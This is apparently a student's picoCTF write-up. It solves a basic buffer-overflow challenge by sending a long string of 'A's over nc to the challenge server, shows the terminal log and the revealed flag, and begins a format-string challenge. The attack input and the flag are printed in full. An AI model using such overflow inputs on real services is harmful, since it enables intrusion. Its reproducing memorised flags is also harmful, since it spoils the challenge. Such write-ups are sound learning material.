<br/>> **The challenge demanded that I initiate a simple buffer overflow attack.**

## Solution:
I first tested the working of the code by giving a random input. As it was taking input, and was related to buffer overflow, so I tried to enter a very large string to produce an overflow. 
This generated the flag.
**Terminal Working :**
```
shraddhatiwari@LAPTOP-F2C51A3F:~$ nc saturn.picoctf.net 49616
Input: HGUFY
The program will exit now

shraddhatiwari@LAPTOP-F2C51A3F:~$ nc saturn.picoctf.net 49616
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
<br/>

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- I learnt the concept of buffer overflow and overflow attack.

<br/>> **The challenge demanded that I give logically sound user inputs based on a basic recognition and understanding of format strings.**

## Solution:
Seeing how the program operates, I  just inputed the options with the most appropriate format strings in them.
